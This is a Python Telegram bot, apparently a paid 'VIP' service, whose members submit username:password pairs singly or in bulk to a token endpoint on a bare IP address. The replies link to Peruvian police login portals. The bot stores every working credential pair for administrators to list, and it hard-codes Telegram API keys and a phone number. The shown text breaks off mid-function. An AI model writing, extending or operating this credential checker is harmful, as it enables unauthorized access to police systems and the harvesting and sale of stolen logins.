import asyncio
import requests
from telethon import TelegramClient, events, Button
from datetime import datetime, timedelta
import json
import os

# Configuración del cliente de Telegram
API_ID = '9161657'
API_HASH = '400dafb52292ea01a8cf1e5c1756a96a'  # Rellena con tu API_HASH
PHONE_NUMBER = '+51981119038'

# Inicializar cliente de Telegram
client = TelegramClient('mi_sesion_token', API_ID, API_HASH)

# Usuario CEO (creador del bot) y administradores
CEO_USER = 'Asteriscom'
admins = {CEO_USER}  # conjunto de administradores, inicialmente solo el CEO

# Archivos JSON para almacenar permisos, URLs (comandos globales del admin), actividad y comandos personalizados de usuarios
ARCHIVO_PERMISOS = 'memoria_permisos.json'
ARCHIVO_URLS = 'memoria_urls.json'
ARCHIVO_ACTIVIDAD = 'memoria_actividad.json'
ARCHIVO_COMANDOS_USUARIOS = 'memoria_comandos_usuarios.json'

# Diccionario para almacenar permisos con fecha de expiración
permisos = {}

# Diccionario para almacenar comandos globales (del administrador)
URLS = {}

# Memoria de actividad de las credenciales (almacenadas de forma única: "usuario:clave")
actividad = {}

# Diccionario para almacenar comandos personalizados de cada usuario con membresía
# Estructura: { username: { comando: {"usuario": valor, "clave": valor}, ... } }
comandos_usuario = {}

# --------------------- VARIABLES PARA ANTISPAM ---------------------
ultimo_comando = {}    # Última vez que el usuario envió un comando
warnings = {}          # Contador de advertencias (warnings)
temp_ban = {}          # Baneos temporales: usuario -> fecha de expiración
permanent_ban = set()   # Baneos permanentes: conjunto de usuarios
# -----------------------------------------------------------------

# Diccionarios para seguimiento de usos diarios en /token y /tokenmasa
token_usage = {}      # Límite 150 usos diarios
tokenmasa_usage = {}  # Límite 10 usos diarios

def check_and_update_usage(username, usage_dict, limit):
    """Verifica y actualiza el contador de usos diarios para un usuario.
    Si el día ha cambiado, reinicia el contador.
    Retorna True si el uso es permitido, o False si se ha excedido el límite.
    """
    today = datetime.now().strftime("%Y-%m-%d")
    if username in usage_dict:
        # Reinicia el contador si el día ha cambiado
        if usage_dict[username]["date"] != today:
            usage_dict[username] = {"date": today, "count": 0}
        if usage_dict[username]["count"] >= limit:
            return False
        usage_dict[username]["count"] += 1
    else:
        usage_dict[username] = {"date": today, "count": 1}
    return True

# Crear archivos JSON si no existen
def crear_archivos_json():
    if not os.path.exists(ARCHIVO_PERMISOS):
        with open(ARCHIVO_PERMISOS, 'w') as archivo:
            json.dump({}, archivo)
    if not os.path.exists(ARCHIVO_URLS):
        with open(ARCHIVO_URLS, 'w') as archivo:
            json.dump({}, archivo)
    if not os.path.exists(ARCHIVO_ACTIVIDAD):
        with open(ARCHIVO_ACTIVIDAD, 'w') as archivo:
            json.dump({}, archivo)
    if not os.path.exists(ARCHIVO_COMANDOS_USUARIOS):
        with open(ARCHIVO_COMANDOS_USUARIOS, 'w') as archivo:
            json.dump({}, archivo)

# Cargar datos desde los archivos JSON
def cargar_datos():
    global permisos, URLS, actividad, comandos_usuario
    if os.path.exists(ARCHIVO_PERMISOS):
        with open(ARCHIVO_PERMISOS, 'r') as archivo:
            datos = json.load(archivo)
            permisos = {usuario: datetime.fromisoformat(tiempo) for usuario, tiempo in datos.items()}
    else:
        guardar_permisos()
    if os.path.exists(ARCHIVO_URLS):
        with open(ARCHIVO_URLS, 'r') as archivo:
            URLS = json.load(archivo)
    else:
        guardar_urls()
    if os.path.exists(ARCHIVO_ACTIVIDAD):
        with open(ARCHIVO_ACTIVIDAD, 'r') as archivo:
            actividad.update(json.load(archivo))
    else:
        guardar_actividad()
    if os.path.exists(ARCHIVO_COMANDOS_USUARIOS):
        with open(ARCHIVO_COMANDOS_USUARIOS, 'r') as archivo:
            comandos_usuario.update(json.load(archivo))
    else:
        guardar_comandos_usuario()

def guardar_permisos():
    datos = {usuario: tiempo.isoformat() for usuario, tiempo in permisos.items()}
    with open(ARCHIVO_PERMISOS, 'w') as archivo:
        json.dump(datos, archivo)

def guardar_urls():
    with open(ARCHIVO_URLS, 'w') as archivo:
        json.dump(URLS, archivo)

def guardar_actividad():
    with open(ARCHIVO_ACTIVIDAD, 'w') as archivo:
        json.dump(actividad, archivo)

def guardar_comandos_usuario():
    with open(ARCHIVO_COMANDOS_USUARIOS, 'w') as archivo:
        json.dump(comandos_usuario, archivo)

# Decorador para responder solo en chats privados
def solo_chats_privados(func):
    async def wrapper(event):
        if not event.is_private:
            await event.reply("")
            return
        await func(event)
    return wrapper

# Decorador para controlar flood/antispam (excepto para administradores)
def anti_spam(func):
    async def wrapper(event):
        sender = await event.get_sender()
        username = sender.username
        ahora = datetime.now()

        if username in admins:
            await func(event)
            return

        if username in permanent_ban:
            await event.reply("❌ Has sido baneado permanentemente por spam. No puedes usar el bot.")
            return

        if username in temp_ban:
            ban_fin = temp_ban[username]
            if ahora < ban_fin:
                return
            else:
                del temp_ban[username]
                await event.reply("✅ Has sido desbaneado. Puedes seguir consultando.")

        if username in ultimo_comando:
            intervalo = (ahora - ultimo_comando[username]).total_seconds()
            if intervalo < 1:
                warnings[username] = warnings.get(username, 0) + 1
                if warnings[username] < 3:
                    temp_ban[username] = ahora + timedelta(minutes=1)
                    await event.reply(f"⚠️ Advertencia {warnings[username]}/3: Estás enviando comandos demasiado rápido. Has sido baneado por 1 minuto.")
                else:
                    permanent_ban.add(username)
                    await event.reply("❌ Has sido baneado permanentemente por spam.")
                return
        ultimo_comando[username] = ahora
        await func(event)
        await asyncio.sleep(1)
    return wrapper

# Función para obtener un token
async def obtener_token(usuario, clave):
    url = f"http://161.132.48.199:7831/api/generar-token?user={usuario}&pass={clave}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            if data.get("coRespuesta") == "0000":
                return data["Token"]
        return None
    except Exception as e:
        print(f"Error al obtener el token para {usuario}: {str(e)}")
        return None

# Formatear respuesta en Markdown para Telegram
def formatear_respuesta_token(usuario, clave, token, estado):
    expiracion = "30s" if estado == "Exitoso✅" else "00s"
    return (
        f"👁️ 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝗰𝗶𝗼́𝗻 𝗱𝗲𝗹 𝗧𝗼𝗸𝗲𝗻:\n\n"
        f"👤 𝗨𝘀𝘂𝗮𝗿𝗶𝗼:  `{usuario}`\n"
        f"🔑 𝗖𝗼𝗻𝘁𝗿𝗮𝘀𝗲𝗻̃𝗮: `{clave}`\n"
        f"🎟️ 𝗧𝗼𝗸𝗲𝗻 𝗴𝗲𝗻𝗲𝗿𝗮𝗱𝗼: `{token if estado == 'Exitoso✅' else 'No disponible'}`\n"
        f"🌐 𝗘𝘀𝘁𝗮𝗱𝗼:  {estado}\n\n"
        f"⌛️ 𝗘𝗫𝗣𝗜𝗥𝗔𝗖𝗜𝗢́𝗡: {expiracion}\n\n"
        f"𝗥𝗲𝘀𝗽𝘂𝗲𝘀𝘁𝗮 𝗰𝗼𝗻 𝗮𝗻𝘁𝗶𝘀𝗽𝗮𝗺 𝗱𝗲 𝟱𝘀\n"
        f"🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @Asteriscom\n"
    )

# Botones con URLs
def crear_botones_urls():
    return [
        Button.url("🔗 SIDPOL", "https://sistemas.policia.gob.pe/denuncias/Login.aspx"),
        Button.url("🔗 SIRDIC", "https://denuncias.policia.gob.pe/sirdic/Login.aspx"),
        Button.url("🔗 ESINPOL", "https://sinpol.pnp.gob.pe/esinpol/"),
    ]

# ---------------- COMANDOS ADMINISTRATIVOS / CEO ----------------

# Otorgar membresía temporal (/vip)
@client.on(events.NewMessage(pattern=r'/vip(\d+)\s+(.+)'))
@solo_chats_privados
@anti_spam
async def otorgar_membresia(event):
    sender = await event.get_sender()
    username = sender.username
    if username not in admins:
        await event.reply("❌ No tienes permiso para otorgar privilegios.")
        return
    dias = int(event.pattern_match.group(1))
    nuevo_usuario = event.pattern_match.group(2).lstrip('@')
    permisos[nuevo_usuario] = datetime.now() + timedelta(days=dias)
    guardar_permisos()
    await event.reply(f"🎉 @{nuevo_usuario} ha recibido {dias} días de membresía VIP.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")

# Comando de respaldo para otorgar membresía (/viptoken30) siempre 30 días
@client.on(events.NewMessage(pattern=r'/viptoken30\s+(.+)'))
@solo_chats_privados
@anti_spam
async def otorgar_membresia_viptoken30(event):
    sender = await event.get_sender()
    username = sender.username
    if username not in admins:
        await event.reply("❌ No tienes permiso para otorgar privilegios.")
        return
    nuevo_usuario = event.pattern_match.group(1).lstrip('@')
    permisos[nuevo_usuario] = datetime.now() + timedelta(days=30)
    guardar_permisos()
    await event.reply(f"🎉 @{nuevo_usuario} ha recibido 30 días de membresía VIP.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")

# Quitar membresía temporal
@client.on(events.NewMessage(pattern=r'/uvip(\d+)\s+(.+)'))
@solo_chats_privados
@anti_spam
async def quitar_membresia(event):
    sender = await event.get_sender()
    username = sender.username
    if username not in admins:
        await event.reply("")
        return
    dias = int(event.pattern_match.group(1))
    usuario_a_quitar = event.pattern_match.group(2).lstrip('@')
    if usuario_a_quitar in permisos:
        permisos[usuario_a_quitar] -= timedelta(days=dias)
        guardar_permisos()
        await event.reply(f"🕒 Se han restado {dias} días de la membresía de @{usuario_a_quitar}.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")
    else:
        await event.reply(f"❌ No se encontraron permisos para @{usuario_a_quitar}.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")

# Otorgar membresía ilimitada
@client.on(events.NewMessage(pattern=r'/vipinf\s+(.+)'))
@solo_chats_privados
@anti_spam
async def otorgar_membresia_ilimitada(event):
    sender = await event.get_sender()
    username = sender.username
    if username not in admins:
        await event.reply("❌ No tienes permiso para otorgar privilegios.")
        return
    nuevo_usuario = event.pattern_match.group(1).lstrip('@')
    permisos[nuevo_usuario] = datetime.max
    guardar_permisos()
    await event.reply(f"♾️ @{nuevo_usuario} ha recibido membresía VIP ilimitada.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")

# Banear usuario
@client.on(events.NewMessage(pattern=r'/ban\s+(.+)'))
@solo_chats_privados
@anti_spam
async def banear_usuario(event):
    sender = await event.get_sender()
    username = sender.username
    if username not in admins:
        await event.reply("")
        return
    usuario_a_banear = event.pattern_match.group(1).lstrip('@')
    if usuario_a_banear in permisos:
        del permisos[usuario_a_banear]
        guardar_permisos()
        await event.reply(f"🚫 @{usuario_a_banear} ha sido baneado y no podrá usar los comandos.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")
    else:
        await event.reply(f"❌ @{usuario_a_banear} no tiene permisos activos.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")

# Desbanear usuario (nuevo comando)
@client.on(events.NewMessage(pattern=r'/desbanear\s+(.+)'))
@solo_chats_privados
@anti_spam
async def desbanear_usuario(event):
    sender = await event.get_sender()
    username = sender.username
    if username not in admins:
        await event.reply("❌ No tienes permiso para desbanear usuarios.")
        return
    usuario_a_desbanear = event.pattern_match.group(1).lstrip('@')
    removidos = False
    if usuario_a_desbanear in temp_ban:
        del temp_ban[usuario_a_desbanear]
        removidos = True
    if usuario_a_desbanear in permanent_ban:
        permanent_ban.remove(usuario_a_desbanear)
        removidos = True
    if removidos:
        await event.reply(f"✅ @{usuario_a_desbanear} ha sido desbaneado.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")
    else:
        await event.reply(f"❌ @{usuario_a_desbanear} no se encontraba baneado.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")

# Consultar tiempo de membresía de cualquier usuario (solo para admin/CEO)
@client.on(events.NewMessage(pattern=r'/me\s+(.+)'))
@solo_chats_privados
@anti_spam
async def verificar_membresia(event):
    sender = await event.get_sender()
    username = sender.username
    if username not in admins:
        await event.reply("")
        return
    usuario_a_verificar = event.pattern_match.group(1).lstrip('@')
    if usuario_a_verificar in permisos:
        tiempo_restante = permisos[usuario_a_verificar] - datetime.now()
        dias = tiempo_restante.days
        segundos = tiempo_restante.seconds
        horas = segundos // 3600
        minutos = (segundos % 3600) // 60
        await event.reply(f"@{usuario_a_verificar} cuenta con {dias} días, {horas} horas y {minutos} minutos de membresía.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")
    else:
        await event.reply(f"❌ No se encontraron permisos para @{usuario_a_verificar}.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")

# Nuevo comando: Reiniciar contador de usos diarios para un usuario (exclusivo del CEO)
@client.on(events.NewMessage(pattern=r'/restartoken\s+(.+)'))
@solo_chats_privados
@anti_spam
async def restartoken(event):
    sender = await event.get_sender()
    username = sender.username
    if username != CEO_USER:
        await event.reply("❌ Solo el CEO puede usar este comando.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")
        return
    target_user = event.pattern_match.group(1).lstrip('@')
    today = datetime.now().strftime("%Y-%m-%d")
    # Reiniciar contadores para /token y /tokenmasa
    token_usage[target_user] = {"date": today, "count": 0}
    tokenmasa_usage[target_user] = {"date": today, "count": 0}
    await event.reply(f"✅ Los contadores diarios de /token y /tokenmasa para @{target_user} han sido reiniciados.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")

# ---------------- COMANDOS PERSONALIZADOS (ADMIN Y USUARIOS CON MEMBRESÍA) ----------------

# Agregar comando personalizado
@client.on(events.NewMessage(pattern=r'/agregar\s+(\w+)\s+([^ ]+)'))
@solo_chats_privados
@anti_spam
async def agregar_comando(event):
    sender = await event.get_sender()
    username = sender.username
    comando = event.pattern_match.group(1)
    credenciales = event.pattern_match.group(2)
    if ":" not in credenciales:
        await event.reply("❌ Formato incorrecto. Usa: /agregar comando usuario:clave\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")
        return
    usuario_cmd, clave = credenciales.split(":", 1)
    if username not in admins:
        if username not in permisos or permisos[username] < datetime.now():
            await event.reply("❌ No tienes permisos para agregar comandos personalizados.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")
            return
        if username not in comandos_usuario:
            comandos_usuario[username] = {}
        comandos_usuario[username][comando] = {"usuario": usuario_cmd, "clave": clave}
        guardar_comandos_usuario()
        await event.reply(f"✅ El comando /{comando} ha sido agregado correctamente a tus comandos.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")
    else:
        URLS[comando] = {"usuario": usuario_cmd, "clave": clave}
        guardar_urls()
        await event.reply(f"✅ El comando /{comando} ha sido agregado correctamente.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")

# Actualizar comando personalizado
@client.on(events.NewMessage(pattern=r'/actualizar\s+(\w+)\s+([^ ]+)'))
@solo_chats_privados
@anti_spam
async def actualizar_comando(event):
    sender = await event.get_sender()
    username = sender.username
    comando = event.pattern_match.group(1)
    credenciales = event.pattern_match.group(2)
    if ":" not in credenciales:
        await event.reply("❌ Formato incorrecto. Usa: /actualizar comando usuario:clave\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")
        return
    usuario_cmd, clave = credenciales.split(":", 1)
    if username not in admins:
        if username not in permisos or permisos[username] < datetime.now():
            await event.reply("❌ No tienes permisos para actualizar comandos personalizados.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")
            return
        if username in comandos_usuario and comando in comandos_usuario[username]:
            comandos_usuario[username][comando] = {"usuario": usuario_cmd, "clave": clave}
            guardar_comandos_usuario()
            await event.reply(f"✅ El comando /{comando} ha sido actualizado correctamente en tus comandos.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")
        else:
            await event.reply(f"❌ El comando /{comando} no existe en tus comandos.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")
    else:
        if comando in URLS:
            URLS[comando] = {"usuario": usuario_cmd, "clave": clave}
            guardar_urls()
            await event.reply(f"✅ El comando /{comando} ha sido actualizado correctamente.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")
        else:
            await event.reply(f"❌ El comando /{comando} no existe.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")

# Eliminar comando personalizado
@client.on(events.NewMessage(pattern=r'/eliminar\s+(\w+)'))
@solo_chats_privados
@anti_spam
async def eliminar_comando(event):
    sender = await event.get_sender()
    username = sender.username
    comando = event.pattern_match.group(1)
    if username not in admins:
        if username not in permisos or permisos[username] < datetime.now():
            await event.reply("❌ No tienes permisos para eliminar comandos personalizados.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")
            return
        if username in comandos_usuario and comando in comandos_usuario[username]:
            del comandos_usuario[username][comando]
            guardar_comandos_usuario()
            await event.reply(f"🗑️ El comando /{comando} ha sido eliminado correctamente de tus comandos.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")
        else:
            await event.reply(f"❌ El comando /{comando} no existe en tus comandos.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")
    else:
        if comando in URLS:
            del URLS[comando]
            guardar_urls()
            await event.reply(f"🗑️ El comando /{comando} ha sido eliminado correctamente.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")
        else:
            await event.reply(f"❌ El comando /{comando} no existe.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")

# Listar comandos personalizados del usuario
@client.on(events.NewMessage(pattern=r'/comandos'))
@solo_chats_privados
@anti_spam
async def listar_comandos_usuario(event):
    sender = await event.get_sender()
    username = sender.username
    if username in admins:
        # Si el usuario es admin/CEO, se listan los comandos globales y los de todos los usuarios
        mensaje = "📋 Comandos Globales (Admin):\n"
        if URLS:
            mensaje += "\n".join([f"/{cmd}: {data['usuario']}:{data['clave']}" for cmd, data in URLS.items()])
        else:
            mensaje += "No hay comandos globales registrados.\n"
        mensaje += "\n\n📋 Comandos personalizados de usuarios:\n"
        if comandos_usuario:
            for user, cmds in comandos_usuario.items():
                mensaje += f"\n👤 @{user}:\n"
                if cmds:
                    for cmd, data in cmds.items():
                        mensaje += f"  /{cmd}: {data['usuario']}:{data['clave']}\n"
                else:
                    mensaje += "  (sin comandos)\n"
        else:
            mensaje += "No hay comandos personalizados registrados."
        await event.reply(mensaje, parse_mode='markdown')
    else:
        # Para usuarios regulares, solo se muestran sus propios comandos
        if username not in permisos or permisos[username] < datetime.now():
            await event.reply("❌ Incorrecto quizás /comandos\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")
            return
        if username in comandos_usuario and comandos_usuario[username]:
            lista = "\n".join([f"/{cmd}: {data['usuario']}:{data['clave']}" for cmd, data in comandos_usuario[username].items()])
            await event.reply(f"📋 Tus comandos personalizados:\n{lista}\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}", parse_mode='markdown')
        else:
            await event.reply("❌ No tienes comandos personalizados registrados.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")

# ---------------- COMANDOS PARA USUARIOS CON MEMBRESÍA ----------------

# Generar token individual (/token) – límite 150 usos diarios
@client.on(events.NewMessage(pattern=r'/token\s+([^ ]+)'))
@solo_chats_privados
@anti_spam
async def generar_token(event):
    sender = await event.get_sender()
    username = sender.username
    if username not in permisos or permisos[username] < datetime.now():
        await event.reply("")
        return
    # Verificar límite diario de 150 usos
    if not check_and_update_usage(username, token_usage, 150):
        await event.reply("❌ Has excedido el límite diario de 150 usos para /token. Inténtalo mañana.")
        return
    credenciales = event.pattern_match.group(1)
    if ":" not in credenciales:
        await event.reply("❌ Formato incorrecto. Usa /token usuario:clave\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")
        return
    usuario, clave = credenciales.split(":", 1)
    # Verificamos si la clave contiene '%'
    if "%" in clave:
        await event.reply("Usuario Innacesible prueba otro")
        return
    token = await obtener_token(usuario, clave)
    estado = "Exitoso✅" if token else "Fallido❌"
    # Guardar en el historial solo si el token es exitoso (sin duplicados)
    if token:
        key = f"{usuario}:{clave}"
        if key not in actividad:
            actividad[key] = {"usuario": usuario, "clave": clave, "token": token, "estado": estado}
            guardar_actividad()
    await event.reply(
        formatear_respuesta_token(usuario, clave, token, estado),
        buttons=crear_botones_urls(),
        parse_mode='markdown'
    )

# Generar tokens en masa (/tokenmasa) – límite 10 usos diarios
@client.on(events.NewMessage(pattern=r'/tokenmasa\s+(.+)'))
@solo_chats_privados
@anti_spam
async def generar_tokens_masa(event):
    sender = await event.get_sender()
    username = sender.username
    if username not in permisos or permisos[username] < datetime.now():
        await event.reply("❌ No tienes una membresía activa.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @Asteriscom")
        return
    # Verificar límite diario de 10 usos
    if not check_and_update_usage(username, tokenmasa_usage, 10):
        await event.reply("❌ Has excedido el límite diario de 10 usos para /tokenmasa. Inténtalo mañana.")
        return
    credenciales_lista = event.pattern_match.group(1).split("|")
    resultados = []
    for cred in credenciales_lista:
        cred = cred.strip()
        if ":" not in cred:
            resultados.append(f"{cred} - Formato incorrecto ❌ \n\n /tokenmasa usuario1:clave1 | usuario2:clave2 | etc. ")
            continue
        usuario, clave = cred.split(":", 1)
        # Si la contraseña contiene '%', la ignoramos
        if "%" in clave:
            resultados.append(f"`{usuario}:{clave}` - Usuario Innacesible prueba otro")
            continue
        token = await obtener_token(usuario, clave)
        if token:
            estado = "Exitoso✅"
            key = f"{usuario}:{clave}"
            if key not in actividad:
                actividad[key] = {"usuario": usuario, "clave": clave, "token": token, "estado": estado}
                guardar_actividad()
            resultados.append(f"`{usuario}:{clave}` - Token {estado}")
        else:
            resultados.append(f"`{usuario}:{clave}` - Token Fallido❌")
    respuesta = "📋 Verificados Correctamente:\n" + "\n".join(resultados)
    await event.reply(respuesta + "\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 Asteriscom", parse_mode='markdown')

# Comando para mostrar los usos diarios restantes (/usos)
@client.on(events.NewMessage(pattern=r'/usos'))
@solo_chats_privados
@anti_spam
async def mostrar_usos(event):
    sender = await event.get_sender()
    username = sender.username
    today = datetime.now().strftime("%Y-%m-%d")
    # Para /token
    token_info = token_usage.get(username, {"date": today, "count": 0})
    used_token = token_info["count"] if token_info["date"] == today else 0
    remaining_token = 150 - used_token
    # Para /tokenmasa
    tokenmasa_info = tokenmasa_usage.get(username, {"date": today, "count": 0})
    used_tokenmasa = tokenmasa_info["count"] if tokenmasa_info["date"] == today else 0
    remaining_tokenmasa = 10 - used_tokenmasa
    await event.reply(
         f"🔑 **USOS DIAROS TOKENBOT**\n\n"
         f"/token: {used_token} usados, {remaining_token} restantes.\n"
         f"/tokenmasa: {used_tokenmasa} usados, {remaining_tokenmasa} restantes.\n\n"
         f"**Así se usa** https://youtu.be/CW7gfrTlr0Y"
    )

# Consultar historial de credenciales (solo para administradores/CEO)
@client.on(events.NewMessage(pattern=r'/historial'))
@solo_chats_privados
@anti_spam
async def ver_historial(event):
    sender = await event.get_sender()
    username = sender.username
    if username not in admins:
        await event.reply("❌ Este comando no existe, quizás /comandos \n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")
        return
    # Filtrar solo los registros con token exitoso
    registros = [
        f"{i + 1}. ` {record['usuario']}:{record['clave']} ` - Token {record['estado']}"
        for i, record in enumerate(actividad.values()) if record['estado'] == "Exitoso✅"
    ]
    if not registros:
        await event.reply("❌ No hay actividad registrada con tokens exitosos.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}", parse_mode='markdown')
        return
    # Enviar en mensajes de 50 registros cada uno
    chunk_size = 50
    chunks = [registros[i:i+chunk_size] for i in range(0, len(registros), chunk_size)]
    for idx, chunk in enumerate(chunks):
        header = "📋 Historial de credenciales (Exitosas):\n" if idx == 0 else ""
        mensaje = header + "\n".join(chunk) + f"\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}"
        await event.reply(mensaje, parse_mode='markdown')

# Limpiar historial (solo para administradores/CEO)
@client.on(events.NewMessage(pattern=r'/limpiar'))
@solo_chats_privados
@anti_spam
async def limpiar_historial(event):
    sender = await event.get_sender()
    username = sender.username
    if username not in admins:
        await event.reply("")
        return
    actividad.clear()
    guardar_actividad()
    await event.reply("🗑️ El historial de actividad ha sido limpiado.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")

# ---------------- COMANDOS EXTRAS PARA ADMIN/CEO ----------------

# Listar todos los comandos de todos los clientes (/cmds)
@client.on(events.NewMessage(pattern=r'/cmds'))
@solo_chats_privados
@anti_spam
async def listar_todos_comandos(event):
    sender = await event.get_sender()
    username = sender.username
    if username not in admins:
        await event.reply("❌ Formato incorrecto. Usa /comandos \n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")
        return
    mensaje = "📋 Comandos Globales (Admin):\n"
    if URLS:
        mensaje += "\n".join([f"/{cmd}: {data['usuario']}:{data['clave']}" for cmd, data in URLS.items()])
    else:
        mensaje += "No hay comandos globales registrados.\n"
    mensaje += "\n\n📋 Comandos personalizados de cada usuario:\n"
    if comandos_usuario:
        for user, cmds in comandos_usuario.items():
            mensaje += f"\n👤 @{user}:\n"
            if cmds:
                for cmd, data in cmds.items():
                    mensaje += f"  /{cmd}: {data['usuario']}:{data['clave']}\n"
            else:
                mensaje += "  (sin comandos)\n"
    else:
        mensaje += "No hay comandos personalizados registrados."
    await event.reply(mensaje, parse_mode='markdown')

# Dar privilegios de administrador (/daradmin)
@client.on(events.NewMessage(pattern=r'/daradmin\s+(.+)'))
@solo_chats_privados
@anti_spam
async def dar_administrador(event):
    sender = await event.get_sender()
    username = sender.username
    # Solo el CEO puede promocionar
    if username != CEO_USER:
        await event.reply("❌ Solo el CEO puede otorgar privilegios de administrador.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")
        return
    nuevo_admin = event.pattern_match.group(1).lstrip('@')
    admins.add(nuevo_admin)
    await event.reply(f"✅ @{nuevo_admin} ha sido promovido a administrador.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")

# Quitar privilegios de administrador (/quitaradmin)
@client.on(events.NewMessage(pattern=r'/quitaradmin\s+(.+)'))
@solo_chats_privados
@anti_spam
async def quitar_administrador(event):
    sender = await event.get_sender()
    username = sender.username
    # Solo el CEO puede degradar administradores
    if username != CEO_USER:
        await event.reply("❌ Solo el CEO puede quitar privilegios de administrador.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")
        return
    admin_a_quitar = event.pattern_match.group(1).lstrip('@')
    if admin_a_quitar in admins and admin_a_quitar != CEO_USER:
        admins.remove(admin_a_quitar)
        await event.reply(f"✅ @{admin_a_quitar} ha perdido los privilegios de administrador.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")
    else:
